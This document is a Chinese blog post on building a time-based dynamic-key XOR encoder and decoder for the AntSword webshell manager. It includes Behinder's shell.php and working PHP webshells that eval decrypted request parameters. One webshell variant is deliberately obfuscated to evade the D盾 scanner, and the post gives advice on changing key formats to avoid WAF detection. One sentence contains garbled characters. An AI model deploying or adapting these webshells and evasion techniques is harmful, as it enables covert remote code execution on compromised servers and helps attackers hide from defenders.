# 蚁剑实现动态秘钥编码器解码器


<meta name="referrer" content="no-referrer" />

## 前言

最近研究了一下蚁剑PHP的RSA和AES编码器，发现都是需要开启`openssl`扩展才可以使用

但是这个模块大多数情况下是不开的，所以就导致蚁剑的强加密类型的编码器、解码器无法使用

于是借鉴了一下冰蝎的思路，实现了一个动态秘钥的编码器解码器。

## 冰蝎的解决方案

我记得冰蝎在1.0版本有同样的问题，模块不开shell就用不了，但是2.0就解决了这个问题。

那么冰蝎是怎么解决的呢。

看一下他的shell.php是怎么写的

```
<?php
@error_reporting(0);
session_start();
if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else
{
    $key=$_SESSION['k'];
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __construct($p) {eval($p."");}}
	@new C($params);
}
?>
```

注意看这一段

```
if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else  xxxxxx
```

如果没有`openssl`扩展，那么就把postçåå®¹è·éæºç§é¥key异或一遍

相当于自己写了个加密函数。

那么当然蚁剑也可以利用此思路来解决此问题。

## 如何生成随机秘钥

冰蝎的做法是先请求两次shell(因为第二次请求的时候才会将秘钥保存到session中)

如果请求中有`pass=xxx`就返回一个十六位的随机秘钥

然后客户端跟服务端分别记下这个秘钥，用于后面流量的加密解密。

但是也带来一个问题，握手获得秘钥的过程已经成为了很多WAF检测的特征。

[冰蝎动态二进制加密WebShell特征分析](https:_www.freebuf.com_articles_web_213905)

### 如何规避特征

当然我们可以用`PHPSESSID`来作为秘钥，蚁剑的AES编码器也是这么做的。

但是因为蚁剑的机制里面没有自动获取cookie这一个操作

所以需要你人工浏览网站->获取cookie->填入配置文件才可以使用，但是太过麻烦。

那么我们能否设置一个不需要握手，并且很容易就可以获得的随机秘钥呢

于是想到可以我们可以用时间

### 时间格式的选择

时间也有很多种格式，选择哪一种呢？

想到如果时间中带有秒的话，很容易发个包过去就错过同一时间了，无法完成加解密。

所以我们可以采用`年-月-日 时-分`的时间格式，然后md5一次，来作为我们的随机秘钥。

## 思路与实现

蚁剑获取时间->生成随机秘钥->加密payload->发送给shell

shell获取时间->生成随机秘钥->解密payload->将回显data编码->返回给蚁剑

蚁剑获取时间->生成随机秘钥->解密返回data->获取信息

要注意的是因为基于时间产生秘钥，所以要保证你的时区是跟shell的时区是一致的。

因为我本地蚁剑是北京时间，所以在shell中也强制设置为北京时间。

### 动态秘钥编码器

不得不说一个坑

同样一句`console.log(new Date().toLocaleString());`

在node中是24小时制

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385337-fb2ec4f2-79fb-4795-9314-31fb61e9a09a.png)

在浏览器跟蚁剑中是12小时制

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385424-117ebc64-cd40-4898-a355-98ed277f4bb0.png)

被坑了好久没发现。。。

干脆重新确定一个24小时制的规范时间格式，也方便后期自定义修改

```
Object.assign(Date.prototype, {
        switch (time) {
            let date = {
                "yy": this.getFullYear(),
                "MM": this.getMonth() + 1,
                "dd": this.getDate(),
                "hh": this.getHours(),
                "mm": this.getMinutes(),
                "ss": this.getSeconds()
            };
            if (/(y+)/i.test(time)) {
                time = time.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length));
            }
            Object.keys(date).forEach(function (i) {
                if (new RegExp("(" + i + ")").test(time)) {
                    if (RegExp.$1.length == 2) {
                        date[i] < 10 ? date[i] = '0' + date[i] : date[i];
                    }
                    time = time.replace(RegExp.$1, date[i]);
                }
            })
            return time;
        }
    })
    
    let newDate = new Date();
    let time = newDate.switch('yyyy-MM-dd hh:mm');
```

所以demo是这样的

```
'use strict';
// code by yzddmr6
/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
  function xor(payload){
    let crypto = require('crypto');
    Object.assign(Date.prototype, {
        switch (time) {
            let date = {
                "yy": this.getFullYear(),
                "MM": this.getMonth() + 1,
                "dd": this.getDate(),
                "hh": this.getHours(),
                "mm": this.getMinutes(),
                "ss": this.getSeconds()
            };
            if (/(y+)/i.test(time)) {
                time = time.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length));
            }
            Object.keys(date).forEach(function (i) {
                if (new RegExp("(" + i + ")").test(time)) {
                    if (RegExp.$1.length == 2) {
                        date[i] < 10 ? date[i] = '0' + date[i] : date[i];
                    }
                    time = time.replace(RegExp.$1, date[i]);
                }
            })
            return time;
        }
    })
    
    let newDate = new Date();
    let time = newDate.switch('yyyy-MM-dd hh:mm');
    let key = crypto.createHash('md5').update(time).digest('hex')
    key=key.split("").map(t => t.charCodeAt(0));
    //let payload="phpinfo();";
    let cipher = payload.split("").map(t => t.charCodeAt(0));
    for(let i=0;i<cipher.length;i++){
        cipher[i]=cipher[i]^key[i%32]
    }
    cipher=cipher.map(t=>String.fromCharCode(t)).join("")
    cipher=Buffer.from(cipher).toString('base64');
    //console.log(cipher)
    return cipher;
  }
  data['_'] = Buffer.from(data['_']).toString('base64');
  data[pwd] = `eval(base64_decode("${data['_']}"));`;
  data[pwd]=xor(data[pwd]);
  delete data['_'];
  return data;
}
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385510-8c630df2-9000-4e1b-bf77-49a0182a59b1.png)

### 动态秘钥解码器

```
'use strict';
//code by yzddmr6
module.exports = {
  /**
   * @returns {string} asenc 将返回数据base64编码
   * 自定义输出函数名称必须为 asenc
   * 该函数使用的语法需要和shell保持一致
   */
  asoutput: () => {
    return `function asenc($out){
      date_default_timezone_set("PRC");
      $key=md5(date("Y-m-d H:i",time()));
      for($i=0;$i<strlen($out);$i++){
          $out[$i] = $out[$i] ^ $key[$i%32];
      }
      return @base64_encode($out);
    }
    `.replace(/\n\s+/g, '');
  },
  /**
   * 解码 Buffer
   * @param {string} data 要被解码的 Buffer
   * @returns {string} 解码后的 Buffer
   */
  decode_buff: (data, ext={}) => {
    function xor(payload){
      let crypto = require('crypto');
      Object.assign(Date.prototype, {
          switch (time) {
              let date = {
                  "yy": this.getFullYear(),
                  "MM": this.getMonth() + 1,
                  "dd": this.getDate(),
                  "hh": this.getHours(),
                  "mm": this.getMinutes(),
                  "ss": this.getSeconds()
              };
              if (/(y+)/i.test(time)) {
                  time = time.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length));
              }
              Object.keys(date).forEach(function (i) {
                  if (new RegExp("(" + i + ")").test(time)) {
                      if (RegExp.$1.length == 2) {
                          date[i] < 10 ? date[i] = '0' + date[i] : date[i];
                      }
                      time = time.replace(RegExp.$1, date[i]);
                  }
              })
              return time;
          }
      })
      
      let newDate = new Date();
      let time = newDate.switch('yyyy-MM-dd hh:mm');
      let key = crypto.createHash('md5').update(time).digest('hex')
      key = key.split("").map(t => t.charCodeAt(0));
      let data = payload;
      let cipher=Buffer.from(data.toString(), 'base64').toString();
      cipher = cipher.split("").map(t => t.charCodeAt(0));
      for (let i = 0; i < cipher.length; i++) {
          cipher[i] = cipher[i] ^ key[i % 32]
      }
      cipher=cipher.map(t=>String.fromCharCode(t)).join("")
      return cipher;
    }
    return xor(data);
  }
}
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385664-cf19cd11-5cbd-4e78-9210-d78d2502bcdb.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385848-5fb2c5c8-9bf8-4804-a48d-15f375627b13.png)

但是发现遇到中文会乱码，所以仅作为一个参考吧

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385963-525e7d95-c6dd-4725-9f2e-1a67f6ce375f.png)

### 服务端

原型

```
<?php
date_default_timezone_set("PRC");
@$post=base64_decode($_REQUEST['yzddmr6']);
$key=md5(date("Y-m-d H:i",time()));
for($i=0;$i<strlen($post);$i++){
    $post[$i] = $post[$i] ^ $key[$i%32];
}
eval($post);
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386075-e6acd59f-ebc4-456c-91f4-91d0117dcf3c.png)

D盾4级，稍微处理一下让他免杀

```
<?php
date_default_timezone_set("PRC");
$key=md5(date("Y-m-d H:i",time()));
class TEST{
    function encode($key){
    @$post=base64_decode($_REQUEST['test']);
    for($i=0;$i<strlen($post);$i++){$post[$i] = $post[$i] ^ $key[$i%32];}
    return $post;}
    function ant($data)
    {return eval($this->encode("$data"));}
}
$test=new TEST;
$test->ant($key);
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386199-cc4d0fb0-0207-43f4-bf62-31aa46a60d90.png)

## 测试

在蚁剑中新建编码器 解码器，然后起一个你喜欢的名字，把上面的代码复制进去即可。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386345-3823971a-ee17-4c35-bf61-537ae0a60ac1.png)

配置一下就可以使用啦

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386450-c9827cc0-5651-4204-8527-df817b3fb63c.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386540-b70b6dc2-9d76-4fc5-9fc1-014f8fa9c889.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386723-f5b68754-4d55-4d25-9059-902cf88da27a.png)

没错，我用的就是著名的backdoorstudy

你可以同时使用动态秘钥编码器跟动态秘钥解码器，也可以只使用编码器，或者动态编码器跟其他解码器结合。

要注意的是，因为一些玄学问题，当你使用了demo中的动态解码器后遇见中文会乱码。

个人建议 动态秘钥编码器+base64解码器 就差不多了。

## 最后

在demo中用的是`年-月-日 时-分`的时间格式，可能过不了多久也会被检测。

如果以后被加入豪华午餐的话，自己可以自由修改日期的格式，例如`日-年-月 时-分`，或者 `日期+盐` 来达到混淆的效果

在编码器中已经留好了日期格式修改的接口，换一换顺序即可。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386828-f0a43108-757f-4400-ada0-9c1071dc74e6.png)

通过以上操作我们已经实现了无需握手传递秘钥的编码器解码器

到这里好像没什么问题了

但是发现蚁剑默认的payload会把data[]数组中其他的参数只是base64一遍

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900386950-6f20457f-e491-4210-aa2a-b92a140b7e96.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900387107-f37be75a-820f-48e0-aeb1-c0f8498a30e6.png)

这样的流量还是容易被检测出，这也是蚁剑的硬伤。

在这篇文章里[WAF拦了蚁剑发送的其它参数时怎么操作](https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw)蚁剑作者也给出了解决方案

但是这样修改的话只是针对一个编码器，不能对所有的编码器有效

最稳固的办法还是自己修改蚁剑硬编码的payload，来满足自己的需求。

本文只是抛砖引玉，没什么技术含量，还望大佬们轻喷。

## 参考文章

https://mp.weixin.qq.com/s/uITAIt-jj3-CYKwXQqFzMw

https://mp.weixin.qq.com/s/IUs3YbWKSAE2ptAw1nrJyg

https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw

https://xz.aliyun.com/t/2774
